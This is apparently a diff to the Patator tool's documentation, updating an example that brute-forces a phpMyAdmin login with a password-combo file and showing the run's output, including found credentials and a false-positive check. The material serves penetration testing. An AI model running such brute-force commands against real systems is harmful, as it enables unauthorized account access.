@@ -61,25 +61,26 @@ $ patator.py ftp_login host=10.0.0.1 user=FILE0 password=qsdf 0=logins.txt -x ig
 * HTTP : Brute-force phpMyAdmin logon
 
 ```
-$ http_fuzz url=http://10.0.0.1/phpmyadmin/index.php method=POST body='pma_username=COMBO00&pma_password=COMBO01&server=1&lang=en' 0=combos.txt follow=1 accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server' -l /tmp/qsdf
-10:55:50 patator    INFO - Starting Patator v0.5 (http://code.google.com/p/patator/) at 2012-06-29 10:55 EST
-10:55:50 patator    INFO - 
-10:55:50 patator    INFO - code size:clen     | candidate                        |   num | mesg
-10:55:50 patator    INFO - ----------------------------------------------------------------------
-10:55:50 patator    INFO - 200  8209:7075     | root:                            |    22 | HTTP/1.1 200 OK
-10:55:51 patator    INFO - 200  3838:2566     | root:p@ssw0rd                    |    44 | HTTP/1.1 200 OK
+$ http_fuzz url=http://10.0.0.1/pma/index.php method=POST body='pma_username=COMBO00&pma_password=COMBO01&server=1&target=index.php&lang=en&token=' 0=combos.txt before_urls=http://10.0.0.1/pma/index.php accept_cookie=1 follow=1 -x ignore:fgrep='Cannot log in to the MySQL server' -l /tmp/qsdf
+11:53:47 patator    INFO - Starting Patator v0.7-beta (http://code.google.com/p/patator/) at 2014-08-31 11:53 EST
+11:53:47 patator    INFO -
+11:53:47 patator    INFO - code size:clen       time | candidate                          |   num | mesg
+11:53:47 patator    INFO - -----------------------------------------------------------------------------
+11:53:48 patator    INFO - 200  49585:0        0.150 | root:p@ssw0rd                      |    26 | HTTP/1.1 200 OK
+11:53:51 patator    INFO - 200  13215:0        0.351 | root:                              |    72 | HTTP/1.1 200 OK
 ^C
-10:55:52 patator    INFO - Hits/Done/Skip/Fail/Size: 2/125/0/0/2342, Avg: 47 r/s, Time: 0h 0m 2s
-10:55:52 patator    INFO - To resume execution, pass --resume 12,13,12,13,12,12,13,13,13,12
+11:53:54 patator    INFO - Hits/Done/Skip/Fail/Size: 2/198/0/0/3000, Avg: 29 r/s, Time: 0h 0m 6s
+11:53:54 patator    INFO - To resume execution, pass --resume 15,15,15,16,15,36,15,16,15,40
 ```
 
-Payload #22 was a false positive:
+Payload #72 was a false positive due to an unexpected error message:
 
 ```
-$ cat /tmp/qsdf/22_200_8209\:7075.txt
-...
-<div class="error">Login without a password is forbidden by configuration (see AllowNoPassword)</div>
+$ grep AllowNoPassword /tmp/qsdf/72_200\:13215\:0\:0.351.txt
+... class="icon ic_s_error" /> Login without a password is forbidden by configuration (see AllowNoPassword)</div><noscript>
 ```
+
+Tested against phpMyAdmin 4.2.7.1.
 
 * SNMPv3 : Find valid usernames
 
